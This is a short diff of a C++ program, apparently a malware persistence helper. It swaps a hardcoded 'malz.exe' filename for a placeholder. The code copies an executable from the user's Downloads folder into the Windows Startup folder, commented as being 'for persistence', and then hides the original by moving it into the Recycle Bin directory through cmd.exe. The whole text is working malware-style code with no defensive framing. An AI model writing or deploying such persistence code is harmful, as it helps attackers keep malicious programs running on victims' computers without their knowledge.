@@ -15,8 +15,8 @@ string username = getenv("USERNAME");
 int main() {
     cout << "Pls no copy pasterino!\n";
 
-    string targetFile = "C:\\Users\\" + username + "\\Downloads\\malz.exe";
-    string targetDIR = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malz.exe";
+    string targetFile = "C:\\Users\\" + username + "\\Downloads\\<TARGET_FILE.EXE>";
+    string targetDIR = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\<TARGET_FILE.EXE>";
 
     fs::copy(targetFile, targetDIR);    //copy malz.exe to Startup directory for persistence
     system(("cmd.exe /c move " + targetFile + " C:\\$Recycle.Bin").c_str());    //requires admin privs
